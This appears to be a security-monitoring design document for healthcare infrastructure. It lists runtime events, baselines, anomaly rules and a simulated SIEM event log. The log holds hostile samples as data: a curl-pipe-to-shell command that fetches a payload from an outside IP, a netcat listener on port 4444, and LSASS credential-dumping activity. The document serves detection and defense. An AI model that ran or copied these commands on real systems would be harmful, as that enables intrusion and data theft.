# Session 2: Runtime Telemetry, Behavior Baselines & Anomaly Triggers
**Project:** Secure System Monitor
**Domain:** Healthcare Infrastructure

---

## 1. Critical Runtime Events (15 Events)
To detect evasive threats (e.g., fileless malware, API exploits), the monitor must capture targeted low-level system behaviors across the following 15 events:

1.  `sys_execve`: Process execution (spawning of new processes/commands).
2.  `sys_ptrace`: Memory injection or process debugging attempts.
3.  `sys_chmod` & `sys_chown`: Unauthorized modification of file permissions.
4.  `tcp_v4_connect` / `tcp_v6_connect`: Initiation of outbound network connections.
5.  `sys_openat` (O_WRONLY/O_RDWR): Write-access to sensitive system or database files.
6.  `sys_unlink`: Deletion or wiping of log files and diagnostic data.
7.  `API_REQ_BOLA`: API requests targeting differing Patient IDs.
8.  `LOGIN_FAIL_BURST`: Burst of authentication failures > 5 in 1 minute.
9.  `HL7_MSG_MALFORMED`: Ingestion of structurally malformed DICOM or HL7 healthcare messages.
10. `CONFIG_CHANGE_REGISTRY`: Modification to critical Windows registry keys or `/etc` Linux configurations.
11. `SENSOR_HEARTBEAT_LOSS`: Unexplained loss of connection from medical IoT sensors.
12. `PROC_NET_BIND`: A process attempting to open/bind to an unauthorized listening port.
13. `MEM_ANONYMOUS_ALLOC`: Unusually large allocation of anonymous memory (indicative of unpacking/payload staging).
14. `API_BULK_EXPORT`: API requests triggering large data volume responses (>100MB).
15. `USER_SUPERADMIN_ELEVATE`: Standard clinical user attempting vertical privilege escalation via `sudo` or similar.

---

## 2. Categorized Event Table

| Category | Relevant Runtime Events | Monitored Target |
| :--- | :--- | :--- |
| **Process** | `sys_execve`, `sys_ptrace`, `MEM_ANONYMOUS_ALLOC` | Process trees, memory maps, child spawning |
| **File / IO** | `sys_openat`, `sys_unlink`, `sys_chmod` | EHR Database directories, server config files |
| **Network** | `tcp_v4_connect`, `PROC_NET_BIND` | Lateral movement, C2 beacons, reverse shells |
| **API** | `API_REQ_BOLA`, `API_BULK_EXPORT` | Patient portal, 3rd-party vendor integrations |
| **User/Identity** | `LOGIN_FAIL_BURST`, `USER_SUPERADMIN_ELEVATE`| Identity Providers (IdP), AD, IAM gateways |
| **Sensor/Domain** | `HL7_MSG_MALFORMED`, `SENSOR_HEARTBEAT_LOSS`| Infusion pumps, MRI controllers, messaging queues |

---

## 3. Baseline Behavior Profiles

| Asset Profile | CPU Usage | Memory I/O | Network Inbound | Network Outbound | Authorized Processes |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **EHR Database Server** | 40% - 85% | High (`postgres`, `mysqld`) | 50Mbps - 200Mbps | 200Mbps - 1Gbps | `postgres`, `cron`, `sshd` |
| **Clinical Workstation**| 5% - 30% | Moderate (Browser, EMR App)| 5Mbps - 20Mbps | 1Mbps - 5Mbps | `chrome.exe`, `emr_client.exe` |
| **API Gateway** | 20% - 60% | Moderate | 1Gbps - 2Gbps | 1Gbps - 2Gbps | `nginx`, `envoy`, `node` |
| **IoT Gateway (Radiology)**| 5% - 15% | Low | 1Mbps (Heartbeats)| High (Image Transfer)| `dicom_agent`, `mosquitto` |
| **Backup Storage NAS** | 10% - 90% | High IOPS (Write-heavy) | 500Mbps - 2Gbps | 5Mbps - 10Mbps | `rsync`, `smbd`, `nfsd` |

*Note: Any sustained deviation exceeding these ranges for > 3 minutes triggers an anomaly state.*

---

## 4. Anomaly Triggers and Impact

| Trigger ID | Anomaly Rule | Threat Reason | Clinical/System Impact |
| :--- | :--- | :--- | :--- |
| `ATR-01` | **Unexpected Child Process:** `nginx` spawns `bash` or `cmd.exe` | Remote Code Execution (RCE) via web vulnerability. | Compromise of patient portal, leading to data breach. |
| `ATR-02` | **Memory Injection:** `sys_ptrace` called on `lsass.exe` | Memory scanning for credential dumping (Pass-the-Hash). | Lateral movement enabling domain-wide ransomware deployment. |
| `ATR-03` | **Data Exfiltration:** Outbound traffic from DB > 5Gbps at 3:00 AM | Covert extraction of PHI during unmonitored hours. | Massive regulatory fine (HIPAA breach) and patient privacy loss. |
| `ATR-04` | **File Deletion Burst:** `sys_unlink` rate > 500 files/sec | Ransomware precursor or attacker covering tracks. | Imminent loss of diagnostic data or system logs. |
| `ATR-05` | **BOLA Exploit:** JWT user `1001` requests `GET /api/patient/2005` | Broken Object Level Authorization (BOLA) exploitation. | Unauthorized access to sensitive medical records of other patients. |
| `ATR-06` | **IoT Connection Drop:** >10% of sensors drop connection concurrently | Coordinated Denial of Service (DoS) targeting medical equipment. | Disruption of real-time patient monitoring (life-safety risk). |
| `ATR-07` | **Malformed Med Traffic:** Flood of invalid HL7 messages | Fuzzing the integration engine to trigger buffer overflows. | Crashing the clinical communication bus, delaying treatments. |
| `ATR-08` | **Unauthorized Network Bind:** Process `python3` binds to port `4444` | Opening a reverse shell or backdoor listening port. | Persistent attacker backdoor established in the internal network. |
| `ATR-09` | **Rapid Permission Change:** `sys_chmod 777` on `/etc/shadow` | Privilege escalation preparation by a compromised account. | Full administrative takeover of the host operating system. |
| `ATR-10` | **Ransomware Encryption:** High CPU + High Disk Write + Rapid Read | Active encryption of network-attached storage or EHR. | Complete operational paralysis of the healthcare facility. |

---

## 5. Structured Runtime Dataset (20 Entries)

*Dataset format simulating a JSON-based SIEM/Telemetry stream.*

| Event ID | Timestamp (UTC) | Event Type | Source Node | Severity | Details (JSON/Parsed string) |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `EVT_1001` | `2026-02-20T08:01:12` | `tcp_v4_connect` | `Clinical-WS-04` | INFO | `{"dest_ip": "10.0.5.20", "dest_port": 443, "proc": "chrome.exe"}` |
| `EVT_1002` | `2026-02-20T08:01:15` | `sys_execve` | `EHR-DB-01` | INFO | `{"cmd": "/usr/lib/postgresql/14/bin/postgres", "user": "postgres"}` |
| `EVT_1003` | `2026-02-20T08:03:00` | `LOGIN_FAIL` | `API-Gateway`| LOW | `{"user": "dr_smith", "src_ip": "192.168.1.55", "reason": "bad_password"}` |
| `EVT_1004` | `2026-02-20T08:04:12` | `PROC_NET_BIND` | `Internal-DNS` | LOW | `{"port": 53, "proc": "named", "protocol": "udp"}` |
| `EVT_1005` | `2026-02-20T08:05:33` | `sys_openat` | `EHR-DB-01` | INFO | `{"file": "/var/lib/postgresql/data/pg_wal/001.log", "mode": "O_RDWR"}` |
| `EVT_1006` | `2026-02-20T08:12:05` | `LOGIN_FAIL_BURST`| `API-Gateway` | **HIGH** | `{"user": "admin", "attempts": 15, "window_sec": 45, "src_ip": "45.22.11.9"}` |
| `EVT_1007` | `2026-02-20T08:14:22` | `sys_execve` | `Patient-Portal`| **CRIT** | `{"cmd": "/bin/bash -c 'curl 185.11.2.3/pay.sh \| sh'", "parent": "nginx"}` *[ATR-01]* |
| `EVT_1008` | `2026-02-20T08:14:25` | `tcp_v4_connect` | `Patient-Portal`| **HIGH** | `{"dest_ip": "185.11.2.3", "dest_port": 80, "proc": "curl"}` |
| `EVT_1009` | `2026-02-20T08:14:28` | `sys_execve` | `Patient-Portal`| **CRIT** | `{"cmd": "./pay.sh", "parent": "bash", "user": "www-data"}` |
| `EVT_1010` | `2026-02-20T08:14:35` | `sys_chmod` | `Patient-Portal`| **HIGH** | `{"file": "/etc/passwd", "mode": "0777", "success": false}` *[ATR-09]* |
| `EVT_1011` | `2026-02-20T08:30:00` | `SENSOR_HRT_LOSS` | `ICU-Gateway-A` | **HIGH** | `{"device_ids": ["INF-A12", "INF-A15"], "duration_sec": 30}` *[ATR-06]* |
| `EVT_1012` | `2026-02-20T08:30:15` | `HL7_MSG_MALFORM` | `DICOM-Router` | **MED** | `{"src_ip": "10.10.5.22", "parser_error": "buffer_overread", "size": 4096}` |
| `EVT_1013` | `2026-02-20T09:15:00` | `API_REQ_BOLA` | `API-Gateway` | **CRIT** | `{"jwt_sub": "UID_902", "req_uri": "/users/UID_444/medical_history"}` *[ATR-05]* |
| `EVT_1014` | `2026-02-20T09:15:01` | `API_BULK_EXPORT` | `API-Gateway` | **HIGH** | `{"jwt_sub": "UID_902", "bytes_transferred": 154000000}` *[ATR-03]* |
| `EVT_1015` | `2026-02-20T10:05:11` | `sys_ptrace` | `Admin-WS-01` | **CRIT** | `{"target_proc": "lsass.exe", "caller_proc": "powershell.exe"}` *[ATR-02]* |
| `EVT_1016` | `2026-02-20T10:06:00` | `PROC_NET_BIND` | `Admin-WS-01` | **HIGH** | `{"port": 4444, "proc": "nc.exe", "protocol": "tcp"}` *[ATR-08]* |
| `EVT_1017` | `2026-02-20T10:08:45` | `sys_openat` | `Backup-NAS` | **CRIT** | `{"file": "/mnt/ehr_backups/db.bak", "mode": "O_RDWR", "proc": "unknown.exe"}` |
| `EVT_1018` | `2026-02-20T10:08:46` | `MEM_ANON_ALLOC` | `Backup-NAS` | **HIGH** | `{"proc": "unknown.exe", "size_mb": 512, "flags": "PROT_EXEC\|PROT_WRITE"}` |
| `EVT_1019` | `2026-02-20T10:09:00` | `sys_unlink` | `Backup-NAS` | **CRIT** | `{"file": "/var/log/syslog", "caller_proc": "unknown.exe"}` *[ATR-04]* |
| `EVT_1020` | `2026-02-20T10:10:00` | `BEHAVIOR_DEV` | `Backup-NAS` | **CRIT** | `{"metric": "disk_write", "value": "950MB/s", "baseline": "10MB/s"}` *[ATR-10]* |

---

## 6. Threat Surface Mapping Table

| Threat Description | Targeted Component | Triggered Runtime Events / Signatures |
| :--- | :--- | :--- |
| **API Parameter Tampering (BOLA)** | Patient Portal API Gateway | `API_REQ_BOLA`, `API_BULK_EXPORT` |
| **Credential Dumping (Mimikatz)** | Clinical/Admin Workstations | `sys_ptrace` (targeting LSASS), `sys_execve` (powershell) |
| **Web Server RCE (Log4Shell style)**| External Web/App Servers | `sys_execve` (shell spawned by web proc), `tcp_v4_connect` (to C2) |
| **Ransomware Encryption** | EHR DB, NAS Storage Arrays | Massive `sys_openat`, sustained high Disk I/O, `sys_unlink` |
| **Medical IoT Disruption (DoS)** | Infusion Pumps, Gateway Servers | `SENSOR_HEARTBEAT_LOSS`, `HL7_MSG_MALFORMED` |
| **Covert C2 Communication** | Internal Servers (Lateral Move) | Periodic `tcp_v4_connect` to untrusted ASNs, hidden `PROC_NET_BIND` |
| **Fileless Malware Staging** | High-value target memory | `MEM_ANONYMOUS_ALLOC` (Read/Write/Execute memory pages) |
| **Insider Mass Data Theft** | EHR Backup / Database | Abnormal `sys_openat` frequency, `API_BULK_EXPORT` during off-hours |
| **Privilege Escalation** | Any Linux/Windows Node | `USER_SUPERADMIN_ELEVATE`, `sys_chmod` on restricted directories |
| **Defense Evasion (Log Wiping)** | Centralized Logging Servers | High volume `sys_unlink` or `sys_openat` matching `*/log/*` paths |
